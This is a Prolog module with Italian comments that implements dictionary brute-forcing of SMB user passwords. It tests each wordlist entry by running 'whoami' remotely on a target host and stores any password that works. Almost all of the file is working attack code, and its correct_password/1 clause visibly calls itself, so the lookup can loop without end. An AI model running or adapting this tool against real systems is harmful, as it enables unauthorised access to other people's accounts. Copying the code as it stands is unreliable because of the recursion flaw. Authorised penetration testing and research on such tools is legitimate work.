/** <smb_brute_password> Utilità per la rottura di password tramite SMB
 *
 *  Questo modulo introduce diversi predicati di utilità 
 *  per la rottura di password utente su protocollo SMB.
 *
 *  @author Mauro Andreolini
 *  @version 0.1
 */
:- module(smb_brute_password, [
	set_password_file/1,
	test_password/4,
	brute_force/4,
	correct_password/1,
	clear_password/0
]).

:- dynamic password_file/1.
:- dynamic correct_password/1.

:- use_module(utils/command_runner).
:- use_module(auxiliary/smb_shell).

%% set_password_file(+FilePath:string) is det 
%
%  Il predicato set_password_file/1 crea un predicato
%  dinamico password_file(FilePath) che memorizza
%  il percorso di un file contenente un dizionario
%  di password.
%
%  @param FilePath Il percorso del file contenenete il
%                  dizionario delle password.
%
set_password_file(FilePath) :-
	retractall(password_file(_)),
	assertz(password_file(FilePath)).

%% test_password(+Username:string, +Password:string, +Host:string, -Success:bool) is det 
%
%  Il predicato test_password/4 verifica se la password
%  Password è corretta per l'utente Username sul servizio
%  SMB dell'host Host. Se la password è corretta, la
%  variabile Success è impostata a true; altrimenti, è
%  impostata a false.
%
%  @param Username Lo username dell'utente di cui si vuole
%                  identificare la password.
%  @param Password La password da testare per l'utente.
%  @param Host L'host esponente il servizio SMB su cui
%              testare la password.
%  @param Success Il valore di uscita del confronto
%                 (true  -> password corretta,
%                  false -> password sbagliata).
%
test_password(Username, Password, Host, Success) :-
	run_command_smb("whoami", [], Host, Username, Password, Stdout, _, _),
	(   sub_atom(Stdout, _, _, _, 'Process whoami')
	->  Success = true,
		retractall(correct_password(_)),
		assertz(correct_password(Password))
	;   Success = false
	).

%% brute_force(+Username:string, +Host:string, +FilePath:string, -FoundPassword:string) is det 
%
%  Il predicato brute_force/4 apre un file dizionario delle
%  password di nome FilePath, legge tutte le password e le
%  prova per l'utente con username Username sul servizio
%  SMB dell'host Host. Se una password è corretta, si
%  interrompe la procedura di brute force e si imposta
%  la variabile FoundPassword alla password individuata.
%  Altrimenti la variabile FoundPassword non è assegnata.
%
%  @param Username Lo username dell'utente di cui si vuole
%                  identificare la password.
%  @param Host L'host esponente il servizio SMB su cui
%              testare le password.
%  @param FilePath Il file dizionario contenente le
%                  password da testare.
%  @param FoundPassword La password corretta o il valore
%                       nullo.
%
brute_force(Username, Host, FilePath, FoundPassword) :-
	setup_call_cleanup(
		open(FilePath, read, Stream),
		brute_loop(Stream, Username, Host, FoundPassword),
		close(Stream)
	).

string_trim(In, Out) :-
	normalize_space(string(Out), In).

brute_loop(Stream, Username, Host, FoundPassword) :-
	read_line_to_string(Stream, Line),
	(   Line == end_of_file
	->  !, fail
	;   string_trim(Line, Password),
		test_password(Username, Password, Host, Success),
		(   Success == true
		->  FoundPassword = Password
		;   brute_loop(Stream, Username, Host, FoundPassword)
		)
	).

%% correct_password(-Password:string) is det 
%
%  Il predicato correct_password/1 restituisce la password
%  indovinata più recente.
%
%  @param Password La password corretta individuata più
%                  recentemente.
%
correct_password(Password) :-
	password_file(_),
	current_predicate(correct_password/1),
	correct_password(Password).

%% clear_password() is det 
%
%  Il predicato clear_password/0 elimina il predicato
%  dinamico correct_password/1.
%
clear_password :-
	retractall(correct_password(_)).
